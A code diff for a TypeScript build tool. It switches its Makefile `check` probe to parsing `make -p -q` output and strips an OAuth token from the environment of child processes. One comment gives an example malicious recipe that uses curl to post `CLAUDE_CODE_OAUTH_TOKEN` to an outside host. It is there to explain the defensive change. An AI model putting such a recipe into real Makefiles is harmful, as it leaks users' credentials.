@@ -96,25 +96,49 @@ export type CheckOutput = z.infer<typeof CHECK_OUTPUT>;
 // no LLM, no ecosystem sniffing, so the verdict is the repo's own contract rather than the
 // model's guess at a step list.
 
-/** Wall-clock budget for the `make -q check` probe below. The probe only ever *reads* the
- *  Makefile (question mode never runs a recipe), but a `$(shell ...)` or `include` in the
- *  Makefile can still block, so the gate itself is bounded where the steps it gates are
- *  idle-watchdogged. Overrunning the budget is a false negative — fall through to the skill
- *  path, never a red. */
+/** Wall-clock budget for the `make -p` probe below. The probe only ever dumps Make's database
+ *  (it never runs a recipe), but a `$(shell ...)` or `include` in the Makefile can still block,
+ *  so the gate itself is bounded where the steps it gates are idle-watchdogged. Overrunning the
+ *  budget is a false negative — fall through to the skill path, never a red. */
 const MAKE_CHECK_PROBE_TIMEOUT_MS = 5_000;
-/** Sentinel the probe's `Promise.race` uses to tell a budget overrun apart from a real exit
- *  code (which is always 0–255, never a symbol). */
+/** Sentinel the probe's `Promise.race` uses to tell a budget overrun apart from a normal exit. */
 const MAKE_CHECK_PROBE_TIMEOUT = Symbol("make-check-probe-timeout");
 
-/** Whether the repo root Makefile declares a `check:` target Make itself would register — the
- *  gate for the deterministic `make check` path. Asked of `make -q check`, not matched against
- *  source lines: question mode exits 0 when `check` is up to date, 1 when it needs remaking,
- *  and 2 on error (including "No rule to make target 'check'"), so 0/1 mean a real target and 2
- *  means none. That is exactly the distinction the old column-0 regex got wrong — a `define
- *  UNUSED\ncheck:\nendef` block or a disabled conditional contains the line but registers no
- *  rule, so Make lands at 2 where the regex matched and produced the false red this path exists
- *  to avoid. A missing Makefile, a missing `make`, or a probe that overruns its budget all fall
- *  through to the skill path. */
+/** Whether a `make -p` database dump contains an explicit `check:` rule WITH a recipe. The dump
+ *  prints every registered rule as a header line (`check:`, `check::`, `check: dep …`) followed
+ *  by `# …` comment lines and, when the rule has a recipe, a `#  commands to execute (from …)`
+ *  / `#  recipe to execute (from …)` marker before the tab-indented recipe lines (the wording
+ *  differs across GNU make versions, so both are matched). Requiring BOTH the header and the
+ *  recipe marker — scoped to the header's own block — is what distinguishes a real target from
+ *  the shapes exit-code sniffing cannot: a file/dir literally named `check` and a catch-all `%:`
+ *  pattern rule register no `check:` header at all, and a `check:`-shaped line inside a
+ *  `define … endef` block is dumped verbatim in the *variables* section with no marker. */
+function makeCheckTargetHasRecipe(db: string): boolean {
+  const lines = db.split("\n");
+  for (let i = 0; i < lines.length; i++) {
+    if (!/^check::?/.test(lines[i])) continue;
+    // Found an explicit `check` rule header. Its block runs to the next rule header — a
+    // column-0, non-whitespace, non-`#` line; `# …` comments and tab-indented recipe lines
+    // belong to this rule. The recipe marker only ever follows a REAL rule.
+    for (let j = i + 1; j < lines.length; j++) {
+      const line = lines[j];
+      if (/^[^ \t#]/.test(line)) break;
+      if (/(commands|recipe) to execute \(from/.test(line)) return true;
+    }
+  }
+  return false;
+}
+
+/** Whether the repo root Makefile declares an explicit `check:` target with a recipe — the gate
+ *  for the deterministic `make check` path. Detected by parsing `make -p`'s database, not by
+ *  sniffing `make -q check`'s exit code: exit 0 also fires for a file/dir named `check` (or a
+ *  recipe-less `check:` target), exit 1 for a catch-all `%:` pattern rule, and exit 2 both for
+ *  "no rule to make target" AND for a genuine `check:` target whose prerequisite has no rule —
+ *  so no exit code cleanly separates "real target with a recipe" from the rest. That is exactly
+ *  the distinction the old column-0 source regex got wrong too: a `define UNUSED\ncheck:\nendef`
+ *  block or a disabled conditional contains the line but registers no rule, so the regex matched
+ *  and produced the false red this path exists to avoid. A missing Makefile, a missing `make`,
+ *  or a probe that overruns its budget all fall through to the skill path. */
 export async function hasMakeCheckTarget(cwd: string): Promise<boolean> {
   if (!existsSync(join(cwd, "Makefile"))) return false;
   if (!Bun.which("make")) return false;
@@ -125,18 +149,31 @@ export async function hasMakeCheckTarget(cwd: string): Promise<boolean> {
   const env: Record<string, string> = {};
   for (const [k, v] of Object.entries(process.env)) if (v !== undefined) env[k] = v;
   scrubSensitiveEnv(env);
+  // `scrubSensitiveEnv` deliberately keeps `CLAUDE_CODE_OAUTH_TOKEN` so the `claude` CLI can
+  // authenticate on Max; this probe runs `make` directly, never `claude`, so the token has no
+  // reason to be present and a `$(shell ...)` in the Makefile must not be able to exfiltrate it
+  // (same reasoning as `runStep`).
+  delete env.CLAUDE_CODE_OAUTH_TOKEN;
   env.PWD = cwd;
 
-  const proc = Bun.spawn(["make", "-q", "check"], {
+  // `-q` (question mode) is load-bearing: bare `make -p` still BUILDS the default goal after
+  // dumping the database, so it would run the very recipe the probe is only meant to *detect*
+  // (and a recipe that backgrounds a child would orphan it, or `kill -TERM $$PPID` would kill
+  // the probe). With `-q` the database is dumped and nothing is remade — the same no-recipe
+  // guarantee the old `make -q` probe had.
+  const proc = Bun.spawn(["make", "-p", "-q"], {
     cwd,
     stdin: "ignore",
-    stdout: "ignore",
+    stdout: "pipe",
     stderr: "ignore",
     env,
     // A `$(shell ...)` child must not outlive the probe on a timeout; a group kill reaches it.
     detached: true,
   });
 
+  // Drain stdout concurrently so a large database dump can't block the child (and a spurious
+  // timeout) while we wait for it to exit.
+  const stdoutText = new Response(proc.stdout).text();
   let timer: ReturnType<typeof setTimeout> | undefined;
   const outcome = await Promise.race([
     proc.exited,
@@ -154,7 +191,7 @@ export async function hasMakeCheckTarget(cwd: string): Promise<boolean> {
     }
     return false;
   }
-  return outcome === 0 || outcome === 1;
+  return makeCheckTargetHasRecipe(await stdoutText);
 }
 
 const MAKE_CHECK_IDLE_CHECK_INTERVAL_MS = 5_000;
@@ -208,6 +245,11 @@ async function runStep(
   const env: Record<string, string> = {};
   for (const [k, v] of Object.entries(process.env)) if (v !== undefined) env[k] = v;
   scrubSensitiveEnv(env);
+  // `scrubSensitiveEnv` deliberately keeps `CLAUDE_CODE_OAUTH_TOKEN` so the `claude` CLI can
+  // authenticate on Max; this path runs `make`/`fallow` directly, never `claude`, so the token
+  // has no legitimate reason to be present — dropping it closes an exfiltration hole for an
+  // untrusted dispatch Makefile (`check:; curl -d "t=$$CLAUDE_CODE_OAUTH_TOKEN" …`).
+  delete env.CLAUDE_CODE_OAUTH_TOKEN;
   // `Bun.spawn`'s `cwd` does not update the child's `PWD` env var, and `process.env` carries the
   // LaunchAgent's stale `PWD` — pinned to the main checkout, not this command's `cwd`. A `make
   // check` recipe that reads `$(PWD)`/`$PWD` would then validate the WRONG tree (a false green
@@ -225,7 +267,9 @@ async function runStep(
     // child — see the note on `killGroup`.
     detached: true,
   });
-  const untrack = trackExternalProc(proc, jobId);
+  // `detached: true` (flag passed through) so `terminateSessionsForJob`/`terminateActiveSessions`
+  // group-kill this process rather than signalling only the leader — see `trackExternalProc`.
+  const untrack = trackExternalProc(proc, jobId, true);
 
   let lastActivityAt = Date.now();
   let idleKilled = false;
